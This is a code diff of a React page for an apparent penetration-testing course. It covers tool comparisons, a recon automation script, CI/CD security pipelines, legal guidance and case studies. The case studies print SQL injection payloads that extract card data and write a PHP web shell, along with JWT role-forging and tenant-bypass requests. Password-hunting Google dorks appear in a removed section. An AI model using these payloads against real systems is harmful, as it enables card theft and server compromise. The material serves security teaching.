+    const accounts = await web3.eth.getAccounts();
+    for (let account of accounts) {
+        try {
+            await contract.methods.onlyOwner().send({from: account});
+            console.log('Access control bypass found!');
+        } catch (error) {
+            console.log('Access control working for', account);
+        }
+    }
+}
+
+// DeFi protocol testing
+async function testDefiProtocol(protocolAddress) {
+    // Flash loan attack simulation
+    // Price manipulation testing
+    // Governance token exploitation
+    // Liquidity pool manipulation
+}`}
+                    title="Web3 Security Testing"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Tools & Resources */}
+        <TabsContent value="tools-resources" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Terminal className="h-5 w-5" />
+                Professional Toolkit
+              </CardTitle>
+              <CardDescription>
+                Comprehensive collection of advanced penetration testing tools and resources
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Commercial vs Open Source Tools</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Commercial Solutions</h5>
+                      <div className="space-y-2">
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">Burp Suite Professional</span>
+                            <Badge variant="outline">$399/year</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">Manual testing integration, extensive customization</p>
+                        </div>
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">Acunetix</span>
+                            <Badge variant="outline">$4,500+/year</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">High accuracy, modern web app support</p>
+                        </div>
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">Nessus Professional</span>
+                            <Badge variant="outline">$3,990/year</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">Comprehensive vulnerability database</p>
+                        </div>
                       </div>
                     </div>
-                    {openSections.includes(section.id) ? (
-                      <ChevronDown className="h-5 w-5" />
-                    ) : (
-                      <ChevronRight className="h-5 w-5" />
-                    )}
                   </div>
-                </CardHeader>
-              </CollapsibleTrigger>
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Open Source Alternatives</h5>
+                      <div className="space-y-2">
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">OWASP ZAP</span>
+                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">Active development, CI/CD integration</p>
+                        </div>
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">Nuclei</span>
+                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">Template-based scanning, community-driven</p>
+                        </div>
+                        <div className="p-3 bg-cybr-muted/20 rounded">
+                          <div className="flex justify-between items-center mb-1">
+                            <span className="font-medium">Nikto</span>
+                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
+                          </div>
+                          <p className="text-sm text-cybr-muted">Web server scanner, plugin system</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
 
-              <CollapsibleContent>
-                <CardContent className="pt-0">
-                  <ScrollArea className="h-auto max-h-[600px]">
-                    {section.id === 'reconnaissance' && <ReconnaissanceContent />}
-                    {section.id === 'vulnerability-assessment' && <VulnerabilityAssessmentContent />}
-                    {section.id === 'manual-testing' && <ManualTestingContent />}
-                    {section.id === 'exploitation' && <ExploitationContent />}
-                    {section.id === 'professional-testing' && <ProfessionalTestingContent />}
-                    {section.id === 'cloud-security' && <CloudSecurityContent />}
-                    {section.id === 'mobile-iot' && <MobileIoTContent />}
-                    {section.id === 'devsecops' && <DevSecOpsContent />}
-                    {section.id === 'api-security' && <APISecurityContent />}
-                    {section.id === 'modern-web' && <ModernWebContent />}
-                    {section.id === 'ai-ml-security' && <AIMLSecurityContent />}
-                    {section.id === 'blockchain-web3' && <BlockchainWeb3Content />}
-                    {section.id === 'advanced-research' && <AdvancedResearchContent />}
-                    {section.id === 'tools-resources' && <ToolsResourcesContent />}
-                    {section.id === 'case-studies' && <CaseStudiesContent />}
-                    {section.id === 'legal-compliance' && <LegalComplianceContent />}
-                    {section.id === 'enterprise-testing' && <EnterpriseTestingContent />}
-                    {section.id === 'reporting' && <ReportingContent />}
-                    {section.id === 'evasion-techniques' && <EvasionTechniquesContent />}
-                    {section.id === 'threat-intelligence' && <ThreatIntelligenceContent />}
-                  </ScrollArea>
-                </CardContent>
-              </CollapsibleContent>
-            </Collapsible>
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Tool Integration & Automation</h4>
+                <CodeExample
+                  language="python"
+                  code={`#!/usr/bin/env python3
+"""
+Advanced Web Penetration Testing Automation Framework
+Integrates multiple tools for comprehensive assessment
+"""
+
+import subprocess
+import json
+import asyncio
+import aiohttp
+from pathlib import Path
+
+class WebPentestFramework:
+    def __init__(self, target, output_dir="results"):
+        self.target = target
+        self.output_dir = Path(output_dir)
+        self.output_dir.mkdir(exist_ok=True)
+        
+    async def run_reconnaissance(self):
+        """Run comprehensive reconnaissance phase"""
+        tasks = [
+            self.subdomain_enumeration(),
+            self.technology_detection(),
+            self.content_discovery(),
+            self.port_scanning()
+        ]
+        await asyncio.gather(*tasks)
+    
+    async def subdomain_enumeration(self):
+        """Enumerate subdomains using multiple tools"""
+        tools = [
+            f"subfinder -d {self.target} -o {self.output_dir}/subdomains_subfinder.txt",
+            f"amass enum -d {self.target} -o {self.output_dir}/subdomains_amass.txt",
+            f"assetfinder {self.target} > {self.output_dir}/subdomains_assetfinder.txt"
+        ]
+        
+        for tool in tools:
+            process = await asyncio.create_subprocess_shell(
+                tool, stdout=asyncio.subprocess.PIPE
+            )
+            await process.communicate()
+    
+    async def vulnerability_assessment(self):
+        """Run vulnerability assessment phase"""
+        await asyncio.gather(
+            self.nuclei_scan(),
+            self.nikto_scan(),
+            self.custom_payloads()
+        )
+    
+    async def nuclei_scan(self):
+        """Run Nuclei template-based scanning"""
+        cmd = f"nuclei -u https://{self.target} -t nuclei-templates/ -json -o {self.output_dir}/nuclei_results.json"
+        process = await asyncio.create_subprocess_shell(cmd)
+        await process.communicate()
+    
+    async def generate_report(self):
+        """Generate comprehensive report"""
+        results = {}
+        
+        # Aggregate results from all tools
+        for result_file in self.output_dir.glob("*.json"):
+            with open(result_file) as f:
+                results[result_file.stem] = json.load(f)
+        
+        # Generate HTML report
+        report_html = self.create_html_report(results)
+        with open(self.output_dir / "report.html", "w") as f:
+            f.write(report_html)
+    
+    def create_html_report(self, results):
+        """Create professional HTML report"""
+        return f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Web Penetration Test Report - {self.target}</title>
+            <style>
+                body {{ font-family: Arial, sans-serif; margin: 40px; }}
+                .header {{ background: #f0f0f0; padding: 20px; }}
+                .finding {{ margin: 20px 0; padding: 15px; border-left: 4px solid #ff4444; }}
+                .critical {{ border-color: #ff0000; }}
+                .high {{ border-color: #ff8800; }}
+                .medium {{ border-color: #ffaa00; }}
+                .low {{ border-color: #00aa00; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>Web Penetration Test Report</h1>
+                <h2>Target: {self.target}</h2>
+                <p>Generated: {datetime.now().isoformat()}</p>
+            </div>
+            <!-- Report content -->
+        </body>
+        </html>
+        """
+
+# Usage example
+async def main():
+    framework = WebPentestFramework("example.com")
+    await framework.run_reconnaissance()
+    await framework.vulnerability_assessment()
+    await framework.generate_report()
+
+if __name__ == "__main__":
+    asyncio.run(main())`}
+                  title="Automation Framework"
+                />
+              </div>
+            </CardContent>
           </Card>
-        ))}
-      </div>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Professional Development Resources</CardTitle>
+              <CardDescription>Certification paths and learning resources for career advancement</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div>
+                  <h5 className="font-medium mb-2">Entry-Level Certifications</h5>
+                  <ul className="text-sm space-y-1 text-cybr-muted">
+                    <li>• CompTIA Security+</li>
+                    <li>• GIAC Security Essentials (GSEC)</li>
+                    <li>• EC-Council Computer Hacking Forensic Investigator (CHFI)</li>
+                  </ul>
+                </div>
+                <div>
+                  <h5 className="font-medium mb-2">Intermediate Certifications</h5>
+                  <ul className="text-sm space-y-1 text-cybr-muted">
+                    <li>• Certified Ethical Hacker (CEH)</li>
+                    <li>• GIAC Penetration Tester (GPEN)</li>
+                    <li>• CompTIA PenTest+</li>
+                  </ul>
+                </div>
+                <div>
+                  <h5 className="font-medium mb-2">Advanced Certifications</h5>
+                  <ul className="text-sm space-y-1 text-cybr-muted">
+                    <li>• Offensive Security Certified Professional (OSCP)</li>
+                    <li>• GIAC Expert-Level (GSE)</li>
+                    <li>• GIAC Web Application Penetration Tester (GWEB)</li>
+                  </ul>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Case Studies */}
+        <TabsContent value="case-studies" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <FileSearch className="h-5 w-5" />
+                Real-World Case Studies
+              </CardTitle>
+              <CardDescription>
+                Detailed analysis of actual penetration testing engagements and lessons learned
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Case Study 1: E-commerce Platform Assessment</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Engagement Overview</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <strong>Target:</strong> Large e-commerce platform (500K+ users)</li>
+                        <li>• <strong>Timeline:</strong> 3-week assessment</li>
+                        <li>• <strong>Scope:</strong> Web application, mobile app, APIs</li>
+                        <li>• <strong>Team:</strong> 3 senior penetration testers</li>
+                        <li>• <strong>Methodology:</strong> OWASP Testing Guide + PTES</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Key Findings</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <span className="text-red-500">Critical:</span> SQL injection in payment processing</li>
+                        <li>• <span className="text-orange-500">High:</span> Stored XSS in user reviews</li>
+                        <li>• <span className="text-orange-500">High:</span> IDOR in order management</li>
+                        <li>• <span className="text-yellow-500">Medium:</span> CSRF in account settings</li>
+                        <li>• <span className="text-green-500">Low:</span> Information disclosure in headers</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Business Impact</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <strong>Financial:</strong> Potential $2M+ in fraudulent transactions</li>
+                        <li>• <strong>Reputation:</strong> Brand damage from data breach</li>
+                        <li>• <strong>Compliance:</strong> PCI DSS violations identified</li>
+                        <li>• <strong>Legal:</strong> GDPR compliance issues</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Lessons Learned</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Importance of secure coding practices</li>
+                        <li>• Need for comprehensive input validation</li>
+                        <li>• Regular security code reviews required</li>
+                        <li>• Employee security awareness training gaps</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Technical Deep Dive: SQL Injection Exploitation</h4>
+                <CodeExample
+                  language="sql"
+                  code={`-- Discovery Phase
+-- Initial parameter testing in payment processing endpoint
+POST /api/payment/process HTTP/1.1
+Content-Type: application/json
+
+{
+  "card_number": "4111111111111111",
+  "amount": "100.00",
+  "merchant_id": "12345'"
+}
+
+-- Error revealed MySQL syntax error, confirming SQL injection
+
+-- Exploitation Phase
+-- Union-based injection to extract sensitive data
+{
+  "merchant_id": "12345' UNION SELECT 1,2,3,user(),database(),version()-- "
+}
+
+-- Response revealed database structure and version
+-- Further exploitation to extract payment data
+{
+  "merchant_id": "12345' UNION SELECT card_number,cvv,expiry_date FROM payment_cards LIMIT 10-- "
+}
+
+-- Privilege Escalation
+-- Attempted to write web shell via SQL injection
+{
+  "merchant_id": "12345'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- "
+}
+
+-- Impact Assessment
+-- Demonstrated ability to:
+-- 1. Extract all customer payment information
+-- 2. Modify transaction amounts
+-- 3. Create unauthorized transactions
+-- 4. Potentially gain server-level access`}
+                  title="SQL Injection Exploitation Chain"
+                />
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Case Study 2: SaaS Platform Security Assessment</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Multi-Tenant Security Issues</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Tenant isolation bypass via subdomain enumeration</li>
+                        <li>• Database-level tenant mixing in shared tables</li>
+                        <li>• API endpoints lacking tenant validation</li>
+                        <li>• Cross-tenant data access via IDOR</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Authentication & Authorization Flaws</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• JWT token manipulation for privilege escalation</li>
+                        <li>• Session fixation in SSO implementation</li>
+                        <li>• Weak password reset token generation</li>
+                        <li>• Missing rate limiting on authentication endpoints</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="http"
+                    code={`# Multi-Tenant Security Bypass Example
+
+# 1. Subdomain enumeration revealed internal tenant
+# GET https://internal-tenant.saas-platform.com
+
+# 2. API endpoint tenant bypass
+GET /api/v1/users?tenant_id=victim_tenant HTTP/1.1
+Authorization: Bearer attacker_jwt_token
+X-Tenant-ID: victim_tenant
+
+# 3. Database-level tenant mixing
+POST /api/v1/reports/generate HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer valid_token
+
+{
+  "report_type": "user_activity",
+  "tenant_filter": "../../../*",
+  "include_all_tenants": true
+}
+
+# 4. JWT manipulation for privilege escalation
+# Original JWT payload:
+{
+  "user_id": "12345",
+  "tenant_id": "attacker_tenant",
+  "role": "user",
+  "permissions": ["read"]
+}
+
+# Modified JWT payload:
+{
+  "user_id": "12345", 
+  "tenant_id": "victim_tenant",
+  "role": "admin",
+  "permissions": ["read", "write", "delete", "admin"]
+}`}
+                    title="Multi-Tenant Bypass"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Legal & Compliance */}
+        <TabsContent value="legal-compliance" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Lock className="h-5 w-5" />
+                Legal Framework & Compliance
+              </CardTitle>
+              <CardDescription>
+                Legal considerations, compliance requirements, and ethical guidelines for professional penetration testing
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Legal Documentation Requirements</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Pre-Engagement Documentation</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Non-Disclosure Agreement (NDA)</li>
+                        <li>• Statement of Work (SOW)</li>
+                        <li>• Rules of Engagement (RoE)</li>
+                        <li>• Liability and Indemnification clauses</li>
+                        <li>• Emergency contact procedures</li>
+                        <li>• Scope definition and boundaries</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Regulatory Compliance Frameworks</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• PCI DSS: Payment card industry requirements</li>
+                        <li>• HIPAA: Healthcare information protection</li>
+                        <li>• SOX: Financial reporting compliance</li>
+                        <li>• GDPR: Data protection and privacy</li>
+                        <li>• ISO 27001: Information security management</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">International Legal Considerations</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <strong>US:</strong> Computer Fraud and Abuse Act (CFAA)</li>
+                        <li>• <strong>UK:</strong> Computer Misuse Act 1990</li>
+                        <li>• <strong>EU:</strong> Network and Information Security Directive</li>
+                        <li>• <strong>Canada:</strong> Personal Information Protection Act</li>
+                        <li>• Cross-border data transfer restrictions</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Ethical Guidelines</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Principle of least privilege testing</li>
+                        <li>• Data confidentiality and integrity</li>
+                        <li>• Responsible disclosure practices</li>
+                        <li>• Client data protection measures</li>
+                        <li>• Professional conduct standards</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Risk Management & Liability</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Risk Assessment Matrix</h5>
+                      <div className="space-y-2">
+                        <div className="flex justify-between p-2 bg-red-500/10 rounded">
+                          <span className="text-red-600 font-medium">Critical Risk</span>
+                          <span className="text-sm">System compromise, data breach</span>
+                        </div>
+                        <div className="flex justify-between p-2 bg-orange-500/10 rounded">
+                          <span className="text-orange-600 font-medium">High Risk</span>
+                          <span className="text-sm">Service disruption, unauthorized access</span>
+                        </div>
+                        <div className="flex justify-between p-2 bg-yellow-500/10 rounded">
+                          <span className="text-yellow-600 font-medium">Medium Risk</span>
+                          <span className="text-sm">Information disclosure, privilege escalation</span>
+                        </div>
+                        <div className="flex justify-between p-2 bg-green-500/10 rounded">
+                          <span className="text-green-600 font-medium">Low Risk</span>
+                          <span className="text-sm">Minor configuration issues</span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Insurance & Professional Protection</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Professional liability insurance coverage</li>
+                        <li>• Errors and omissions (E&O) insurance</li>
+                        <li>• Cyber liability insurance for data breaches</li>
+                        <li>• Legal defense cost coverage</li>
+                        <li>• Business interruption protection</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Incident Response Procedures</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Immediate notification protocols</li>
+                        <li>• Evidence preservation procedures</li>
+                        <li>• Client communication guidelines</li>
+                        <li>• Legal counsel engagement process</li>
+                        <li>• Regulatory reporting requirements</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* DevSecOps Integration */}
+        <TabsContent value="devsecops" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Code className="h-5 w-5" />
+                DevSecOps Integration
+              </CardTitle>
+              <CardDescription>
+                Integrating security testing into development pipelines and CI/CD processes
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">CI/CD Security Integration</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="yaml"
+                    code={`# GitLab CI/CD Security Pipeline
+stages:
+  - build
+  - test
+  - security
+  - deploy
+
+# Static Application Security Testing (SAST)
+sast:
+  stage: security
+  script:
+    - semgrep --config=auto --json --output=sast-results.json src/
+    - bandit -r src/ -f json -o bandit-results.json
+    - sonarqube-scanner
+  artifacts:
+    reports:
+      sast: sast-results.json
+    expire_in: 1 week
+
+# Dynamic Application Security Testing (DAST)
+dast:
+  stage: security
+  script:
+    - docker run --rm -v $(pwd):/zap/wrk/:rw \\
+        owasp/zap2docker-stable zap-baseline.py \\
+        -t $APPLICATION_URL -g gen.conf -r dast-report.html
+  artifacts:
+    reports:
+      dast: dast-report.html
+    expire_in: 1 week
+
+# Container Security Scanning
+container_scan:
+  stage: security
+  script:
+    - trivy image --format json --output container-scan.json $CI_REGISTRY_IMAGE
+  artifacts:
+    reports:
+      container_scanning: container-scan.json`}
+                    title="GitLab CI/CD Security"
+                  />
+                  <CodeExample
+                    language="yaml"
+                    code={`# GitHub Actions Security Workflow
+name: Security Testing
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    
+    # SAST with CodeQL
+    - name: Initialize CodeQL
+      uses: github/codeql-action/init@v1
+      with:
+        languages: javascript, python
+    
+    - name: Autobuild
+      uses: github/codeql-action/autobuild@v1
+      
+    - name: Perform CodeQL Analysis
+      uses: github/codeql-action/analyze@v1
+
+    # Dependency Scanning
+    - name: Run Snyk to check for vulnerabilities
+      uses: snyk/actions/node@master
+      env:
+        SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
+      with:
+        args: --severity-threshold=high
+    
+    # Secret Scanning
+    - name: Secret Scanning
+      run: |
+        docker run --rm -v "$PWD:/pwd" \\
+          trufflesecurity/trufflehog:latest git \\
+          file:///pwd --only-verified
+    
+    # Infrastructure as Code Scanning
+    - name: Checkov IaC Scan
+      uses: bridgecrewio/checkov-action@master
+      with:
+        directory: ./terraform
+        framework: terraform`}
+                    title="GitHub Actions Security"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Security as Code Implementation</h4>
+                <CodeExample
+                  language="python"
+                  code={`#!/usr/bin/env python3
+"""
+Security as Code - Automated Security Testing Framework
+Integrates multiple security tools in development pipeline
+"""
+
+import subprocess
+import json
+import sys
+from pathlib import Path
+
+class SecurityPipeline:
+    def __init__(self, project_path, config_file="security-config.json"):
+        self.project_path = Path(project_path)
+        self.config = self.load_config(config_file)
+        self.results = {}
+    
+    def load_config(self, config_file):
+        """Load security testing configuration"""
+        with open(config_file) as f:
+            return json.load(f)
+    
+    def run_sast(self):
+        """Run Static Application Security Testing"""
+        print("Running SAST...")
+        
+        # Semgrep for multiple languages
+        semgrep_cmd = [
+            "semgrep", "--config=auto", "--json", 
+            "--output=sast-semgrep.json", str(self.project_path)
+        ]
+        subprocess.run(semgrep_cmd, check=True)
+        
+        # Bandit for Python
+        if any(self.project_path.glob("**/*.py")):
+            bandit_cmd = [
+                "bandit", "-r", str(self.project_path), 
+                "-f", "json", "-o", "sast-bandit.json"
+            ]
+            subprocess.run(bandit_cmd)
+        
+        # ESLint Security Plugin for JavaScript
+        if any(self.project_path.glob("**/*.js")):
+            eslint_cmd = [
+                "eslint", str(self.project_path), 
+                "--ext", ".js,.jsx,.ts,.tsx",
+                "--format", "json", 
+                "--output-file", "sast-eslint.json"
+            ]
+            subprocess.run(eslint_cmd)
+    
+    def run_dependency_check(self):
+        """Check for vulnerable dependencies"""
+        print("Running dependency security check...")
+        
+        # Safety for Python dependencies
+        if (self.project_path / "requirements.txt").exists():
+            safety_cmd = ["safety", "check", "--json", "--output", "deps-safety.json"]
+            subprocess.run(safety_cmd)
+        
+        # npm audit for Node.js
+        if (self.project_path / "package.json").exists():
+            npm_cmd = ["npm", "audit", "--json"]
+            result = subprocess.run(npm_cmd, capture_output=True, text=True)
+            with open("deps-npm.json", "w") as f:
+                f.write(result.stdout)
+    
+    def run_secret_scan(self):
+        """Scan for secrets and credentials"""
+        print("Running secret scanning...")
+        
+        # TruffleHog for git repositories
+        if (self.project_path / ".git").exists():
+            trufflehog_cmd = [
+                "docker", "run", "--rm", "-v", f"{self.project_path}:/pwd",
+                "trufflesecurity/trufflehog:latest", "git", 
+                "file:///pwd", "--json"
+            ]
+            result = subprocess.run(trufflehog_cmd, capture_output=True, text=True)
+            with open("secrets-trufflehog.json", "w") as f:
+                f.write(result.stdout)
+    
+    def run_infrastructure_scan(self):
+        """Scan Infrastructure as Code"""
+        print("Running IaC security scanning...")
+        
+        # Checkov for multiple IaC formats
+        iac_files = list(self.project_path.glob("**/*.tf")) + \\
+                   list(self.project_path.glob("**/*.yaml")) + \\
+                   list(self.project_path.glob("**/*.yml"))
+        
+        if iac_files:
+            checkov_cmd = [
+                "checkov", "-d", str(self.project_path), 
+                "--output", "json", "--output-file", "iac-checkov.json"
+            ]
+            subprocess.run(checkov_cmd)
+    
+    def generate_security_report(self):
+        """Generate comprehensive security report"""
+        print("Generating security report...")
+        
+        # Aggregate all results
+        report_data = {
+            "timestamp": datetime.now().isoformat(),
+            "project": str(self.project_path),
+            "sast_results": self.load_json_file("sast-semgrep.json"),
+            "dependency_results": self.load_json_file("deps-safety.json"),
+            "secret_results": self.load_json_file("secrets-trufflehog.json"),
+            "iac_results": self.load_json_file("iac-checkov.json")
+        }
+        
+        # Calculate risk score
+        risk_score = self.calculate_risk_score(report_data)
+        report_data["risk_score"] = risk_score
+        
+        # Generate HTML report
+        html_report = self.create_html_report(report_data)
+        with open("security-report.html", "w") as f:
+            f.write(html_report)
+        
+        return risk_score
+    
+    def calculate_risk_score(self, report_data):
+        """Calculate overall security risk score"""
+        score = 0
+        
+        # SAST findings
+        if report_data.get("sast_results"):
+            for finding in report_data["sast_results"].get("results", []):
+                severity = finding.get("extra", {}).get("severity", "INFO")
+                if severity == "ERROR": score += 10
+                elif severity == "WARNING": score += 5
+                elif severity == "INFO": score += 1
+        
+        # Dependency vulnerabilities
+        if report_data.get("dependency_results"):
+            vulnerabilities = report_data["dependency_results"].get("vulnerabilities", [])
+            score += len(vulnerabilities) * 3
+        
+        # Secrets found
+        if report_data.get("secret_results"):
+            secrets = json.loads(report_data["secret_results"]) if isinstance(report_data["secret_results"], str) else []
+            score += len(secrets) * 15
+        
+        return min(score, 100)  # Cap at 100
+    
+    def run_full_pipeline(self):
+        """Execute complete security pipeline"""
+        try:
+            self.run_sast()
+            self.run_dependency_check()
+            self.run_secret_scan()
+            self.run_infrastructure_scan()
+            risk_score = self.generate_security_report()
+            
+            # Fail build if risk score is too high
+            if risk_score > self.config.get("max_risk_score", 50):
+                print(f"Security check failed: Risk score {risk_score} exceeds threshold")
+                sys.exit(1)
+            
+            print(f"Security check passed: Risk score {risk_score}")
+            return True
+            
+        except Exception as e:
+            print(f"Security pipeline failed: {e}")
+            sys.exit(1)
+
+# Usage in CI/CD pipeline
+if __name__ == "__main__":
+    pipeline = SecurityPipeline(".")
+    pipeline.run_full_pipeline()`}
+                  title="Security as Code Framework"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+      </Tabs>
     </div>
   );
 };
-
-// Reconnaissance Content Component
-const ReconnaissanceContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Search className="h-5 w-5" />
-        OSINT (Open Source Intelligence) Gathering
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-4 mb-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Google Dorking Mastery</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <code className="text-sm">
-                  site:example.com filetype:pdf | filetype:doc | filetype:xls
-                </code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <code className="text-sm">
-                  site:example.com inurl:admin | inurl:login | inurl:dashboard
-                </code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <code className="text-sm">
-                  "password" | "passwd" | "pwd" site:example.com
-                </code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <code className="text-sm">
-                  intitle:"index of" site:example.com
-                </code>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Social Media Intelligence</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <Badge variant="outline">Employee Profiling</Badge>
-              <Badge variant="outline">Technology Stack Discovery</Badge>
-              <Badge variant="outline">Email Pattern Analysis</Badge>
-              <Badge variant="outline">Physical Security Assessment</Badge>
-              <Badge variant="outline">Supply Chain Mapping</Badge>
-              <Badge variant="outline">Executive Intelligence</Badge>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-
-      <div className="bg-cybr-muted/20 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">Advanced OSINT Tools (25+ Tools)</h4>
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-          {[
-            'theHarvester', 'Maltego', 'Recon-ng', 'SpiderFoot',
-            'FOCA', 'Metagoofil', 'Sherlock', 'Social Mapper',
-            'Shodan', 'Censys', 'BuiltWith', 'Wayback Machine',
-            'DNS Dumpster', 'Fierce', 'Amass', 'Subfinder',
-            'Aquatone', 'Photon', 'Ghunt', 'TinEye',
-            'Pipl', 'Have I Been Pwned', 'SecurityTrails', 'Creepy',
-            'IntelTechniques'
-          ].map(tool => (
-            <Badge key={tool} variant="secondary" className="justify-center">
-              {tool}
-            </Badge>
-          ))}
-        </div>
